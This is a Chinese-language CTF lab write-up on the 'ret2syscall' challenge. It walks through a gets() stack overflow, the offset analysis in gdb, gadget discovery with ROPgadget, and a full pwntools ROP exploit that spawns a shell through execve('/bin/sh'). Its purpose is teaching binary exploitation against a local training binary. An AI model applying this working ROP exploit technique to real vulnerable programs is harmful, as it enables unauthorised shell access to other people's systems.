# ret2syscall

> reference: https://github.com/ctf-wiki/ctf-wiki  Pwn: Linux Pwn: 栈溢出: 基本ROP
>
> writer: github.com/hex-16   data: 2021.3   contact: hexhex16@outlook.com
>
> file: ret2syscall    (download from https://github.com/ctf-wiki/ctf-wiki)
>
> 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别

- 该例无法直接使用程序自身get shell，需构造参数后，使用系统调用`int 0x80`，实现`execve("/bin/sh", NULL, NULL);`

# checksec

```bash
$ file ./ret2syscall
./ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
$ checksec --file=ret2syscall
RELRO          STACK CANARY     NX         PIE     RPATH     RUNPATH    Symbols      FORTIFY Fortified Fortifiable FILE
Partial RELRO  No canary found  NX enabled No PIE  No RPATH  No RUNPATH 2255) Symbols  No    0         0           ret2syscall
```

- 32bit，开启NX保护，没有其他保护



# IDA: main

- IDA中显示的main函数的伪c代码：

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

- 存在危险函数调用`gets`，存在栈溢出漏洞

```assembly
.text:08048E83                 mov     dword ptr [esp], offset aWhatDoYouPlanT ; "What do you plan to do?"
.text:08048E8A                 call    puts            ; Call Procedure
.text:08048E8F                 lea     eax, [esp+28]   ; Load Effective Address
.text:08048E93                 mov     [esp], eax
.text:08048E96                 call    gets            ; gets(&v4); # 调用 gets(&v4); 的地方 ; 后面gdb的断点可以下在这
.text:08048E9B                 mov     eax, 0
.text:08048EA0                 leave                   ; High Level Procedure Exit
.text:08048EA1                 retn                    ; Return Near from Procedure
```



# gdb：偏移地址分析

```assembly
$ gdb -q ./ret2syscall
pwndbg: loaded 188 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./ret2syscall...
pwndbg> b *0x08048E96
Breakpoint 1 at 0x8048e96: file rop.c, line 15.
pwndbg> r
Starting program: /home/kali/CTF/pwn/ret2syscall
This time, no system() and NO SHELLCODE!!!
What do you plan to do?

Breakpoint 1, 0x08048e96 in main () at rop.c:15
15      rop.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c ; v4地址：0xffffd3dc
 EBX  0x80481a8 (_init) ◂— push   ebx
 ECX  0x80eb4d4 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x18
 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8065cb0 (__stpcpy_ssse3) ◂— mov    edx, dword ptr [esp + 4]
 ESI  0x0
 EBP  0xffffd448 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx ; ebp: 0xffffd448
 ESP  0xffffd3c0 —▸ 0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
 EIP  0x8048e96 (main+114) ◂— call   0x804f650
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────
 ► 0x8048e96 <main+114>    call   gets <gets>
        arg[0]: 0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
        arg[1]: 0x0
        arg[2]: 0x1
        arg[3]: 0x0

   0x8048e9b <main+119>    mov    eax, 0
   0x8048ea0 <main+124>    leave
   0x8048ea1 <main+125>    ret

   0x8048ea2               nop   ................................
───────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ esp  0xffffd3c0 —▸ 0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
01:0004│      0xffffd3c4 ◂— 0x0
02:0008│      0xffffd3c8 ◂— 0x1
03:000c│      0xffffd3cc ◂— 0x0
04:0010│      0xffffd3d0 ◂— 0x1
05:0014│      0xffffd3d4 —▸ 0xffffd4d4 —▸ 0xffffd63f ◂— '/home/kali/CTF/pwn/ret2syscall'
06:0018│      0xffffd3d8 —▸ 0xffffd4dc —▸ 0xffffd65e ◂— 'USER=kali'
07:001c│ eax  0xffffd3dc —▸ 0x80bce97 (__register_frame_info+39) ◂— add    esp, 0x1c
───────────────────────────────────────────────[ BACKTRACE ]────────────────────────
 ► f 0  8048e96 main+114
   f 1  804907a __libc_start_main+458
───────────────────────────────────────────────────────────────────────────────────────────────────
```

- v4地址：`0xffffd3dc`, ebp: `0xffffd448`,  v4 相对于 ebp 的偏移为 108，需要覆盖的返回地址相对于 v4 的偏移为 112



- 由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用

> **gadgets**: 以 `ret` 结尾的指令序列，通过这些指令序列，可修改某些地址的内容，以控制程序的执行流程



# 构造系统调用

- 简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用
- 比如说这里我们利用如下系统调用来获取 shell

```cpp
execve("/bin/sh", NULL, NULL);
```

其中，该程序是 32 位，所以我们需要使得

- 系统调用号，即 `eax` 应该为 0xb   （查32bit的系统调用号）
- 第一个参数，即 `ebx` 应该指向 `/bin/sh` 的地址，其实执行 `sh` 的地址也可以。
- 第二个参数，即 `ecx` 应该为 0
- 第三个参数，即 `edx` 应该为 0



## ROPgadget: 逐步构造



```bash
$ ROPgadget --binary ret2syscall  --only 'pop|ret' | grep 'eax' # 寻找控制 eax 的 gadgets
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret  # 这个是将被利用的 gadget
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

- 以上都可以来控制EAX，选择`0x080bb196 : pop eax ; ret`

```bash
$ ROPgadget --binary ret2syscall  --only 'pop|ret' | grep 'ebx' # 寻找控制 ebx 的 gadgets
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret # 这里可以控制edx, ecx, ebx 三个
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

- 选择`0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret`，加上前面找到的控制eax的，所需寄存器都找到了

```bash
$ ROPgadget --binary ret2syscall  --string "/bin/sh" # 获得 /bin/sh 字符串对应的地址
Strings information
============================================================
0x080be408 : /bin/sh
```
- 找到`/bin/sh` 字符串的地址`0x080be408`

```bash
$ ROPgadget --binary ret2syscall  --only "int" # 找 int 0x80 的地址
Gadgets information
============================================================
0x08049421 : int 0x80
```

- 找到`int 0x80`的地址`0x08049421`

# Exploit

```python
from pwn import *

sh = process('./ret2syscall')
context.log_level = "DEBUG"
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(['A' * (108 + 4), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 
# pop_eax_ret 将覆盖在 gets(&v4); 的返回地址上
# 0xb: execve的系统调用号 # type(payload) = bytes
sh.sendline(payload)
sh.interactive()
```



## payload Analysis

```python
# 先将payload的所有用于覆盖RA用的地址换成8bytes的全c,d,e,f
payload = flat(['A' * (108 + 4), 0xcccccccc, 0xb, 0xdddddddd, 0, 0, 0xeeeeeeee,0xffffffff])
# 忽略掉前面的所有A，则剩下的 payload.hex() 输出为：
# cccccccc0b000000dddddddd0000000000000000eeeeeeeeffffffff
```

对于`gets(&v4)`来说，被payload覆盖后的栈如下所示（捋逻辑时从下往上看）

```assembly
; High Address 高地址 ; gets函数的栈被payload覆盖之后如下
ffffffff ; ret; 相当于pop EIP; 跳转到执行 int 0x80
eeeeeeee ; pop ebx ; ebx的值更改为eeeeeeee 实际为"/bin/sh"的地址
00000000 ; pop ecx ; ecx的值更改为0，执行完后ESP上移
00000000 ; pop edx ; edx的值更改为0，执行前ESP指向这里，执行完后ESP上移
dddddddd ; ret指令相当于pop EIP; EIP的值被更改为dddddddd ; 跳转到执行 pop_edx_ecx_ebx_ret
0b000000 ; pop eax; eax 的值被更改为 0xb; 然后ESP向上移，ESP指向dddddddd
cccccccc ; ret; 相当于pop EIP; ESP上移; EIP被修改为cccccccc; overflow: Original RA => cccccccc; 覆盖为pop_eax_ret的地址
41414141 ; 在执行ret指令前，ESP会被恢复到指向EBP处
........
41414141
; Low Address 低地址
```

- 从下网上看注释，可以发现ESP的值随着接连不断的pop; ret(pop EIP)指令而不断上移(值增大)，在这过程中，eax, edx, ecx, ebx被依次改变，最后跳转到`int 0x80`，实现了 `execve("/bin/sh", NULL, NULL);`的系统调用

> - 系统调用号，`eax` 应该为 0xb   （查32bit的系统调用号）
> - 第一个参数，`ebx` 应该指向 `/bin/sh` 的地址，其实执行 `sh` 的地址也可以。
> - 第二个参数，`ecx` 应该为 0
> - 第三个参数，`edx` 应该为 0